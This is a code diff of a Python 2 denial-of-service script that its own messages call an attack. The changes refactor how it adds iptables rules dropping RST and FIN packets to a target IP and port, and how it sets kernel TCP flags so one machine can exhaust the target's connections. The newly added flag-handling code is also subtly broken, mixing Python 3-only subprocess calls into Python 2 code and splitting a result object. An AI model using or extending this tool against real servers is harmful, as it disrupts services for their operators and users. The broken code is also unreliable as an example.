@@ -52,34 +52,73 @@ except Exception as e:
 print "+ Target IP is %s" % (ip)
 
 # Helper variables
-connectionsPerWorker = 40000
+savedFlags = {}
+connectionsPerWorker = 5000
 threads = []
 finish = False
 
+kernelFlags = {
+    "fs.file-max": 1000000,
+    "net.ipv4.tcp_fin_timeout": 1,
+    "net.ipv4.tcp_orphan_retries": 1,
+    "net.ipv4.tcp_tw_reuse": 1,
+    "net.ipv4.tcp_no_metrics_save": 1,
+    "net.ipv4.tcp_sack": 0,
+    "net.ipv4.tcp_dsack": 0,
+    "net.ipv4.tcp_retries2": 1,
+    "net.ipv4.tcp_reordering": 15,
+    "net.ipv4.tcp_max_orphans": 100000,
+    "net.ipv4.ip_local_port_range": "2000 65535"
+}
+
+ipTables = [
+    "PREROUTING -s %s -p tcp --sport %d -j NOTRACK" % (ip, port),
+    "OUTPUT -d %s -p tcp --dport %d --tcp-flags RST RST -j DROP" % (ip, port),
+    "OUTPUT -d %s -p tcp --dport %d --tcp-flags FIN FIN -j DROP" % (ip, port),
+    "OUTPUT -d %s -p tcp --dport %d --tcp-flags FIN,ACK FIN,ACK -j DROP" % (ip, port),
+    "OUTPUT -d %s -p tcp --dport %d -j NOTRACK" % (ip, port)
+]
+
 # Add target to iptables
-def addIpTables(ip, port):
-    print "+ Adding DROP and NOTRACK iptables for the target..."
-    os.system("iptables -t raw -I PREROUTING -s %s -p tcp --sport %d -j NOTRACK" % (ip, port))
-    os.system("iptables -t raw -I OUTPUT -d %s -p tcp --dport %d --tcp-flags RST RST -j DROP 2>/dev/null" % (ip, port))
-    os.system("iptables -t raw -I OUTPUT -d %s -p tcp --dport %d --tcp-flags FIN FIN -j DROP 2>/dev/null" % (ip, port))
-    os.system("iptables -t raw -I OUTPUT -d %s -p tcp --dport %d --tcp-flags FIN,ACK FIN,ACK -j DROP 2>/dev/null" % (ip, port))
-    os.system("iptables -t raw -I OUTPUT -d %s -p tcp --dport %d -j NOTRACK 2>/dev/null" % (ip, port))
+def addIpTables(iptables):
+    print "+ Adding iptables for the target..."
+    for i in iptables:
+        os.system("iptables -t raw -I %s 2>/dev/null" % (i))
 
 # Remove target from iptables
-def removeIpTables(ip, port):
-    print "+ Removing DROP and NOTRACK iptables for the target..."
-    os.system("iptables -t raw -D PREROUTING -s %s -p tcp --sport %d -j NOTRACK 2>/dev/null" % (ip, port))
-    os.system("iptables -t raw -D OUTPUT -d %s -p tcp --dport %d --tcp-flags RST RST -j DROP 2>/dev/null" % (ip, port))
-    os.system("iptables -t raw -D OUTPUT -d %s -p tcp --dport %d --tcp-flags FIN FIN -j DROP 2>/dev/null" % (ip, port))
-    os.system("iptables -t raw -D OUTPUT -d %s -p tcp --dport %d --tcp-flags FIN,ACK FIN,ACK -j DROP 2>/dev/null" % (ip, port))
-    os.system("iptables -t raw -D OUTPUT -d %s -p tcp --dport %d -j NOTRACK 2>/dev/null" % (ip, port))
+def removeIpTables(iptables):
+    print "+ Removing iptables for the target..."
+    for i in iptables:
+        os.system("iptables -t raw -D %s 2>/dev/null" % (i))
+
+# Get kernel flags
+def getKernelFlags(flags):
+    print "+ Getting kernel flags"
+    result = {}
+    for flag in flags:
+        try:
+            result[flag] = subprocess.run(["sysctl", str(flag)], capture_output=True).split("=")[-1]
+        except:
+            result[flag] = None
+    return result
+
+# Set kernel flags
+def setKernelFlags(flags):
+    print "+ Setting kernel flags"
+    for flag,value in flags.items():
+        try:
+            subprocess.run(["sysctl", "-w", "%s=\"%s\"" % (flag, value)]);
+        except:
+            pass
 
 # Signal handler
 def sigHandler(signum, frame):
     print "+ Got signal %d!" % (signum)
     global ip
     global port
-    removeIpTables(ip, port)
+    global savedFlags
+    removeIpTables(ipTables)
+    setKernelFlags(savedFlags)
     exit(0)
 
 # Add connection to epoll queue
@@ -99,19 +138,8 @@ except:
     print "! Error: Error importing module 'resource' or setting 'nofile' limit, we will continue anyway (the attack may fail)"
 
 # Set kernel flags
-# TODO: keep initial flags on start and restore them on exit
-# TODO: check if flags are being set, in some Linux versions or configs some flag could be not present
-print "+ Setting kernel flags"
-os.system("echo 1 > /proc/sys/net/ipv4/tcp_fin_timeout")
-os.system("echo 1 > /proc/sys/net/ipv4/tcp_orphan_retries")
-os.system("echo 1 > /proc/sys/net/ipv4/tcp_tw_reuse")
-os.system("echo 1 > /proc/sys/net/ipv4/tcp_no_metrics_save")
-os.system("echo 0 > /proc/sys/net/ipv4/tcp_sack")
-os.system("echo 0 > /proc/sys/net/ipv4/tcp_dsack")
-os.system("echo 1 > /proc/sys/net/ipv4/tcp_retries2")
-os.system("echo 15 > /proc/sys/net/ipv4/tcp_reordering")
-os.system("echo 100000 > /proc/sys/net/ipv4/tcp_max_orphans")
-os.system("echo 2000 65535 > /proc/sys/net/ipv4/ip_local_port_range")
+savedFlags = getKernelFlags(list(kernelFlags.keys()))
+setKernelFlags(flags=kernelFlags)
 
 # Add signal handlers
 try:
@@ -120,10 +148,10 @@ try:
     signal.signal(signal.SIGINT, sigHandler)
     signal.signal(signal.SIGTERM, sigHandler)
 except:
-    print "! Error: Error importing module 'signal' or adding signal handlers, you must restore iptables yourself when the script finishes!!!"
+    print "! Error: Error importing module 'signal' or adding signal handlers, you must restore iptables and kernel flags yourself when the script finishes!!!"
 
 # Add iptables
-addIpTables(ip, port)
+addIpTables(ipTables)
 
 # Main worker function
 def worker(host, ip, port, workerId):
@@ -198,6 +226,7 @@ else:
 
 # If we get here, the attack has finished or script has exited
 print "+ Attack finished"
-removeIpTables(ip, port)
+removeIpTables(ipTables)
+setKernelFlags(savedFlags)
 exit(0)
 
